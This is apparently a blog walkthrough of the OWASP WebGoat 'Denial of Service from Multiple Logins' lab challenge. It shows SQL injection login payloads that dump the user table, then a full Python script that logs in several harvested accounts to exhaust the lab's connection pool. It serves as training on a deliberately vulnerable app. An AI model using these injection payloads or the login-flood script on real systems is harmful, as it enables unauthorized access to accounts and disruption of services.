---
layout: post
title:  "OWASP BWA WebGoat Challenge: Denial of Service"
subtitle: "Denial of Service from Multiple Logins"
date:   2017-01-31 08:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
# Denial of Service from Multiple Logins
Instructions:

- This site allows a user to login multiple times. This site has a database connection pool that allows 2 connections. You must obtain a list of valid users and create a total of 3 logins. 

<img src="{{ site.baseurl }}/images/2017-01-31-webgoat_part_16/dos-start-form.jpg">

Alright so for this DoS attack we need to have the creds of at least 3 users. Let's use some SQL injection to pull all of the users in the db:

```
username: user' or '1' = '1
password: password' or '1' = '1
```

This concatenates to the following SQL statement:

```
SELECT * FROM user_system_data WHERE user_name = 'user' and password = 'password' or '1' = '1'
```

And when we input that to the login prompt:

<img src="{{ site.baseurl }}/images/2017-01-31-webgoat_part_16/injection-results.jpg">

Bingo! Now let's see what a login request looks like so we can create a few for our DoS attack:

```
Username=jsnow&Password=passwd1&SUBMIT=Login
```

Alright. Now let's break out some Python again and get cracking on our DoS script:

{% highlight python %}
import requests


def main():
	max_logins = 3
	accounts = {
		"jsnow":"passwd1",
		"jdoe":"passwd2",
		"jplane":"passwd3",
		"jeff":"jeff",
		"dave":"dave"
	}
	headers = {
		"user-agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
	}
	cookies = dict(JSESSIONID="780D6C32240516F052FDE3EFACD410F5",
	acopendivids="swingset,jotto,phpbb2,redmine",acgroupswithpersist="nada")
	users_logged_in = 0
	x = 0
	while users_logged_in < max_logins:
		x += 1
		x = x % len(accounts)
		username = accounts.keys()[x]
		password = accounts[accounts.keys()[x]]
		params={
			"Username":username, 
			"Password":password,
			"SUBMIT":"Login"
		}
		r = requests.post("http://192.168.56.101/WebGoat/attack?Screen=63&menu=1200", 
			params=params, headers=headers, cookies = cookies)
		if r.status_code == 200:
			if "login failed" not in r.text.lower():
				users_logged_in += 1
				print ("[+] Accounts logged in: {}".format(users_logged_in))
			else:
				print ("[-] Login for {}:{} failed".format(username, password))
	print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=")
	print ("[*] DoS Attack Complete!")
	print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=")
	
main()
{% endhighlight %}

The basic function of this script is to send login requests for up to ```max_logins``` number of users. It loops around the credentials in ```accounts``` (which could cause a hang if we had < ```max_logins``` of valid creds), and creates requests for these users on the login URL. Let's see what happens when we run it:

<img src="{{ site.baseurl }}/images/2017-01-31-webgoat_part_16/dos-results.jpg">

Well, looks like the dave and jeff's accounts weren't accepted for the login, but luckily we found 3 working users. Let's see if we succeeded in DoS:

<img src="{{ site.baseurl }}/images/2017-01-31-webgoat_part_16/dos-success.jpg">

Nice! Although if 3 users logging in simultaneously overloads your login servers, you might need to rework some of your core infrastructure.